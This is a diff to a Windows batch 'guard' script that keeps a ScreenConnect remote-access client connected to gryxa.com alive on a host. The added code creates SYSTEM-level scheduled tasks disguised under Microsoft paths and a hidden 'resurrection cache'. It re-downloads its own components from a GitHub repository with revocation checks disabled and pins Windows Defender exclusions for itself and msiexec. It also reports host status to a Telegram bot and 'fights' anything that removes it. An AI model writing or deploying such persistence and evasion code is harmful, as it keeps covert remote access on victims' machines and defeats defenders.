@@ -1,5 +1,5 @@
 @echo off
-rem WINRTCS_GUARD 0.0.7 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
+rem WINRTCS_GUARD 0.1.3 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
 rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
 rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback).
 rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run).
@@ -34,8 +34,16 @@ rem 0.1.2: battlefield restore (C18) - fight mode marks defender_countered.flag;
 rem   healthy the guard re-enables RTM/behavior/IOAV/script scanning and drops the policy pins,
 rem   but ONLY when the flag exists (never touches admin-configured Defender) and never removes
 rem   the gryxa exclusions. Countermeasures temporary, exclusions permanent.
+rem 0.1.3: survivability + senses (C19). SelfCheck/siege mode (closed-world self-defense: verify
+rem   both tasks + sentinel + core files every run, restore instantly, fast cadence while under
+rem   attack); resurrection cache mirror (C:\ProgramData\Microsoft\WinRTCS\cache); sentinel
+rem   third-re-armer management; one-way fleet digest (Telegram, fire-and-forget, status-only,
+rem   state changes + daily heartbeat - ABSENCE is the wipe signal); shadow learning (kill-scene
+rem   snapshots of non-Windows-path code correlated in suspects.db, REPORT ONLY - promotion to
+rem   action happens via human/AI review -> winrtcs_killlist.cfg, never by the machine).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
+set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "KL=%ZD%\killlist.cfg"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
@@ -46,6 +54,16 @@ set "EXTF=%ZD%\extkill.cnt"
 set "PRESENT=%ZD%\gryxa_present.flag"
 set "LOCK=%ZD%\guard.lock"
 set "LOCKD=%ZD%\guard.lockd"
+set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
+set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
+set "TASKS=\WinRTCSSentinel"
+set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
+set "SACT=cmd.exe /c C:\ProgramData\Microsoft\WinRTCS\cache\winrtcs_sentinel.cmd"
+set "NCFG=%ZD%\notify.cfg"
+set "DGF=%ZD%\digest.cfg"
+set "DSTATE=%ZD%\digest.state"
+set "DHB=%ZD%\digest.hb"
+set "SUSDB=%ZD%\suspects.db"
 set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
@@ -63,6 +81,9 @@ if errorlevel 1 (
 rem --- gate owns the cadence; we own the reset (lock-busy above leaves counter high -> retry next tick) ---
 echo 0>"%ZD%\guard.cnt"
 set "RI=0"
+set "GSTATE=recovering"
+set "SUSREP="
+set "SIEGE_ACT="
 
 if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
 set "STREAK=0"
@@ -71,6 +92,7 @@ set "EXTK=0"
 if exist "%EXTF%" set /p "EXTK=" <"%EXTF%"
 echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK! extkill=!EXTK!>>"%LOG%"
 
+call :SelfCheck
 call :Shields
 call :HideARP
 call :FetchKL
@@ -87,6 +109,7 @@ call :Dedup
 call :Detect
 if not defined GSVC (
   if !EXTK! GEQ 3 (
+    set "GSTATE=paused"
     echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
     echo 60>"%ZD%\guard.cnt"
     goto :Done
@@ -95,6 +118,7 @@ if not defined GSVC (
     set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
     echo [%DATE% %TIME%] gryxa_absent streak=!STREAK!>>"%LOG%"
     call :HuntKiller
+    call :Suspects
   ) else ( echo [%DATE% %TIME%] gryxa_absent_fresh>>"%LOG%" )
   goto :FightThenInstall
 )
@@ -110,7 +134,9 @@ if errorlevel 1 (
     echo [%DATE% %TIME%] start_fail streak=!STREAK!>>"%LOG%"
     call :Forensics
     call :HuntKiller
+    call :Suspects
     if !EXTK! GEQ 3 (
+      set "GSTATE=paused"
       echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
       echo 60>"%ZD%\guard.cnt"
       goto :Done
@@ -133,9 +159,11 @@ call :Session
 if defined GUP ( echo 170>"%ZD%\guard.cnt" & goto :Healthy )
 set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
 echo [%DATE% %TIME%] zombie_persist streak=!STREAK!>>"%LOG%"
+call :Suspects
 goto :FightThenInstall
 
 :Healthy
+set "GSTATE=healthy"
 echo 0>"%STREAKF%"
 echo 0>"%EXTF%"
 echo %DATE% %TIME%>"%PRESENT%"
@@ -153,6 +181,8 @@ echo [%DATE% %TIME%] defender_restored>>"%LOG%"
 exit /b 0
 
 :FightThenInstall
+set "GSTATE=installing"
+if !STREAK! GEQ 2 set "GSTATE=fighting"
 if !STREAK! GEQ 2 call :Fight
 if !STREAK! GEQ 3 call :War
 goto :Install
@@ -258,7 +288,9 @@ set /a "EXTK+=1" & echo !EXTK!>"%EXTF%"
 echo [%DATE% %TIME%] FAIL_svc_not_running streak=!STREAK! extkill=!EXTK!>>"%LOG%"
 call :Forensics
 call :HuntKiller
+call :Suspects
 if !EXTK! GEQ 3 (
+  set "GSTATE=paused"
   echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
   echo 60>"%ZD%\guard.cnt"
   goto :Done
@@ -390,8 +422,131 @@ powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='Silently
 if exist "%ZD%\svc_dead.out" ( type "%ZD%\svc_dead.out">>"%LOG%" & del /f /q "%ZD%\svc_dead.out" >nul 2>&1 )
 exit /b 0
 
+:SelfCheck
+rem --- siege mode (C19): self-defense is a CLOSED world - we know exactly what should exist
+rem --- because we built it. Any gap = confirmed tamper -> restore instantly, no evidence
+rem --- needed, zero false-positive risk (worst case we re-create what already exists). ---
+set "SIEGE="
+if not exist "%CD%" mkdir "%CD%" >nul 2>&1
+schtasks /Query /TN "%TASKA%" >nul 2>&1
+if errorlevel 1 (
+  schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+  set "SIEGE=!SIEGE!agent_task,"
+)
+schtasks /Query /TN "%TASKG%" >nul 2>&1
+if errorlevel 1 (
+  schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+  set "SIEGE=!SIEGE!guard_task,"
+)
+if not exist "%ZD%\winrtcs_run.cmd" (
+  set "SIEGE=!SIEGE!run_file,"
+  if exist "%CD%\winrtcs_run.cmd" copy /y "%CD%\winrtcs_run.cmd" "%ZD%\winrtcs_run.cmd" >nul 2>&1
+)
+if not exist "%ZD%\winrtcs_run.cmd" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%ZD%\run.dl" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  if exist "%ZD%\run.dl" findstr /C:"WINRTCS_RUN" "%ZD%\run.dl" >nul 2>&1 && move /y "%ZD%\run.dl" "%ZD%\winrtcs_run.cmd" >nul 2>&1
+  del /f /q "%ZD%\run.dl" >nul 2>&1
+)
+if not exist "%ZD%\winrtcs_agent.cmd" (
+  set "SIEGE=!SIEGE!agent_file,"
+  if exist "%CD%\winrtcs_agent.cmd" copy /y "%CD%\winrtcs_agent.cmd" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
+)
+if not exist "%ZD%\winrtcs_agent.cmd" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 25 -o "%ZD%\agent.dl" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  if exist "%ZD%\agent.dl" findstr /C:"WINRTCS_AGENT" "%ZD%\agent.dl" >nul 2>&1 && move /y "%ZD%\agent.dl" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
+  del /f /q "%ZD%\agent.dl" >nul 2>&1
+)
+if not exist "%CD%\winrtcs_sentinel.cmd" (
+  set "SIEGE=!SIEGE!sentinel_file,"
+  del /f /q "%CD%\sentinel.dl" >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%CD%\sentinel.dl" "%BASE%/winrtcs_sentinel.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  if exist "%CD%\sentinel.dl" findstr /C:"WINRTCS_SENTINEL" "%CD%\sentinel.dl" >nul 2>&1 && move /y "%CD%\sentinel.dl" "%CD%\winrtcs_sentinel.cmd" >nul 2>&1
+  del /f /q "%CD%\sentinel.dl" >nul 2>&1
+)
+schtasks /Query /TN "%TASKS%" >nul 2>&1
+if errorlevel 1 (
+  if exist "%CD%\winrtcs_sentinel.cmd" (
+    schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+    set "SIEGE=!SIEGE!sentinel_task,"
+  )
+)
+rem --- mirror the running components into the resurrection cache (agent hash-gates its own
+rem --- mirror; here we mirror run/guard which the agent already hash-verified at download) ---
+if exist "%ZD%\winrtcs_agent.cmd" copy /y "%ZD%\winrtcs_agent.cmd" "%CD%\winrtcs_agent.cmd" >nul 2>&1
+if exist "%ZD%\winrtcs_run.cmd" copy /y "%ZD%\winrtcs_run.cmd" "%CD%\winrtcs_run.cmd" >nul 2>&1
+if exist "%ZD%\winrtcs_guard.cmd" copy /y "%ZD%\winrtcs_guard.cmd" "%CD%\winrtcs_guard.cmd" >nul 2>&1
+attrib +h "C:\ProgramData\Microsoft\WinRTCS" >nul 2>&1
+if defined SIEGE (
+  echo [%DATE% %TIME%] SIEGE !SIEGE!>>"%LOG%"
+  set "SIEGE_ACT=1"
+) else (
+  del /f /q "%ZD%\siege.last" >nul 2>&1
+)
+exit /b 0
+
+:Suspects
+rem --- shadow learning (C19): snapshot non-Windows-path code running at the kill scene,
+rem --- correlate across scenes in suspects.db, REPORT ONLY. The machine never acts on
+rem --- suspects; promotion = human/AI review -> one line in winrtcs_killlist.cfg. ---
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $allow=@('^[A-Za-z]:\\Windows\\','ScreenConnect','\\ProgramData\\WinRTCS','\\ProgramData\\Microsoft\\WinRTCS','Windows Defender'); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $p=$t -split '\|'; if($p[0] -eq 'allow' -and $p[1]){ $allow+=$p[1] } } }; $apat=$allow -join '|'; $scene=@(); Get-CimInstance Win32_Process | Where-Object { $_.Path -and ($_.Path -notmatch $apat) } | ForEach-Object { $scene+=$_.Name }; Get-CimInstance Win32_Service | Where-Object { $_.State -eq 'Running' -and $_.PathName -and ($_.PathName -notmatch $apat) } | ForEach-Object { $scene+=('svc:' + $_.Name) }; $scene=$scene | Sort-Object -Unique; $db=@{}; if(Test-Path '%SUSDB%'){ foreach($l in Get-Content '%SUSDB%'){ $p=$l -split '\|'; if($p.Count -ge 2){ $v=0; if([int]::TryParse($p[1],[ref]$v)){ $db[$p[0]]=$v } } } }; foreach($n in $scene){ if($db.ContainsKey($n)){ $db[$n]=$db[$n]+1 } else { $db[$n]=1 } }; $db.GetEnumerator() | Sort-Object Value -Descending | Select-Object -First 60 | ForEach-Object { "$($_.Key)|$($_.Value)" } | Set-Content -Path '%SUSDB%' -Encoding ASCII; $top=($db.GetEnumerator() | Where-Object { $_.Value -ge 2 } | Sort-Object Value -Descending | Select-Object -First 5 | ForEach-Object { $_.Key + '=' + $_.Value }) -join ','; if(-not $top){ $top='none' }; $top | Set-Content -Path '%ZD%\suspects.top' -Encoding ASCII" >nul 2>&1
+if exist "%ZD%\suspects.top" (
+  set /p "SUSREP=" <"%ZD%\suspects.top"
+  echo [%DATE% %TIME%] kill_scene_suspects !SUSREP!>>"%LOG%"
+)
+exit /b 0
+
+:Digest
+rem --- one-way fleet digest (C19): status OUT, nothing IN. Fire-and-forget (detached curl,
+rem --- hard 8s cap) so a blocked/slow network can never stall the health loop. Precedence:
+rem --- local notify.cfg (operator-seeded) overrides repo digest.cfg. No config = silent off. ---
+set "DENA="
+set "DTOK="
+set "DCHAT="
+set "NCFGTOK="
+set "NCFGENA="
+if exist "%DGF%" for /f "usebackq tokens=1,* delims==" %%K in ("%DGF%") do (
+  if /I "%%K"=="ENABLED" set "DENA=%%L"
+  if /I "%%K"=="BOT_TOKEN" set "DTOK=%%L"
+  if /I "%%K"=="CHAT_ID" set "DCHAT=%%L"
+)
+if exist "%NCFG%" (
+  for /f "usebackq tokens=1,* delims==" %%K in ("%NCFG%") do (
+    if /I "%%K"=="ENABLED" ( set "DENA=%%L" & set "NCFGENA=1" )
+    if /I "%%K"=="BOT_TOKEN" ( set "DTOK=%%L" & set "NCFGTOK=1" )
+    if /I "%%K"=="CHAT_ID" set "DCHAT=%%L"
+  )
+)
+if defined NCFGTOK if not defined NCFGENA set "DENA=1"
+if not defined DENA exit /b 0
+if /I "!DENA!"=="0" exit /b 0
+if not defined DTOK exit /b 0
+if not defined DCHAT exit /b 0
+set "SEND="
+set "OLDSTATE="
+if exist "%DSTATE%" set /p "OLDSTATE=" <"%DSTATE%"
+if /I not "!OLDSTATE!"=="!GSTATE!" set "SEND=1"
+set "HBD="
+if exist "%DHB%" set /p "HBD=" <"%DHB%"
+if not "!HBD!"=="%DATE%" set "SEND=1"
+if defined SIEGE_ACT (
+  set "SLAST="
+  if exist "%ZD%\siege.last" set /p "SLAST=" <"%ZD%\siege.last"
+  if /I not "!SLAST!"=="!SIEGE!" (
+    echo !SIEGE!>"%ZD%\siege.last"
+    set "SEND=1"
+  )
+)
+if not defined SEND exit /b 0
+echo !GSTATE!>"%DSTATE%"
+echo %DATE%>"%DHB%"
+set "MSG=[WINRTCS] host=%COMPUTERNAME% state=!GSTATE! guard=0.1.3 streak=!STREAK! extkill=!EXTK!"
+if defined SIEGE_ACT set "MSG=!MSG! siege=!SIEGE!"
+if defined SUSREP if /I not "!SUSREP!"=="none" set "MSG=!MSG! suspects=!SUSREP!"
+start "" /min "%CURL%" -s -L --ssl-no-revoke --connect-timeout 4 --max-time 8 "https://api.telegram.org/bot!DTOK!/sendMessage" --data-urlencode "chat_id=!DCHAT!" --data-urlencode "text=!MSG!" >nul 2>&1
+exit /b 0
+
 :FetchKL
-rem --- kill list is data: fresh copy from repo wins, cached copy otherwise, builtin as last resort ---
+rem --- kill list + digest config are data: fresh copy from repo wins, cached copy otherwise ---
 set "KLNEW=%ZD%\killlist.new"
 del /f /q "%KLNEW%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%KLNEW%" "%BASE%/winrtcs_killlist.cfg?t=%RANDOM%%RANDOM%" >nul 2>&1
@@ -399,6 +554,13 @@ if exist "%KLNEW%" (
   findstr /C:"WINRTCS_KILLLIST" "%KLNEW%" >nul 2>&1 && move /y "%KLNEW%" "%KL%" >nul 2>&1
 )
 del /f /q "%KLNEW%" >nul 2>&1
+set "DNEW=%ZD%\digest.new"
+del /f /q "%DNEW%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%DNEW%" "%BASE%/winrtcs_digest.cfg?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%DNEW%" (
+  findstr /C:"WINRTCS_DIGEST" "%DNEW%" >nul 2>&1 && move /y "%DNEW%" "%DGF%" >nul 2>&1
+)
+del /f /q "%DNEW%" >nul 2>&1
 exit /b 0
 
 :HuntKiller
@@ -424,12 +586,13 @@ rem --- channel 1: Policies-key reg pins (instant; GP channel honored even with 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%GDIR86%" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%GDIR64%" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%ZD%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\Microsoft\WinRTCS" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.WindowsClient.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 rem --- channel 2: cmdlet API, bounded (60s cap) so a busy Defender service can't hang the guard ---
 del /f /q "%ZD%\shields.done" >nul 2>&1
-start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $st=Get-MpComputerStatus; $paths=@('%GDIR86%','%GDIR64%','%ZD%'); foreach($root in 'C:\Program Files (x86)','C:\Program Files'){ Get-ChildItem $root -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { $paths += $_.FullName } }; foreach($p in ($paths | Select-Object -Unique)){ Add-MpPreference -ExclusionPath $p }; foreach($x in 'ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe','msiexec.exe'){ Add-MpPreference -ExclusionProcess $x }; ('shields_ok rtm=' + $st.RealTimeProtectionEnabled + ' tp=' + $st.IsTamperProtected) | Set-Content -Path '%ZD%\shields.done' -Encoding ASCII" >nul 2>&1
+start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $st=Get-MpComputerStatus; $paths=@('%GDIR86%','%GDIR64%','%ZD%','C:\ProgramData\Microsoft\WinRTCS'); foreach($root in 'C:\Program Files (x86)','C:\Program Files'){ Get-ChildItem $root -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { $paths += $_.FullName } }; foreach($p in ($paths | Select-Object -Unique)){ Add-MpPreference -ExclusionPath $p }; foreach($x in 'ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe','msiexec.exe'){ Add-MpPreference -ExclusionProcess $x }; ('shields_ok rtm=' + $st.RealTimeProtectionEnabled + ' tp=' + $st.IsTamperProtected) | Set-Content -Path '%ZD%\shields.done' -Encoding ASCII" >nul 2>&1
 set "SW=0"
 :ShieldsWait
 if exist "%ZD%\shields.done" goto :ShieldsOut
@@ -442,6 +605,11 @@ if exist "%ZD%\shields.done" ( type "%ZD%\shields.done">>"%LOG%" & del /f /q "%Z
 exit /b 0
 
 :Done
+if defined SIEGE_ACT (
+  set "GSTATE=!GSTATE!+siege"
+  echo 170>"%ZD%\guard.cnt"
+)
+call :Digest
 rmdir "%LOCKD%" >nul 2>&1
 del /f /q "%LOCK%" >nul 2>&1
 endlocal & exit /b 0
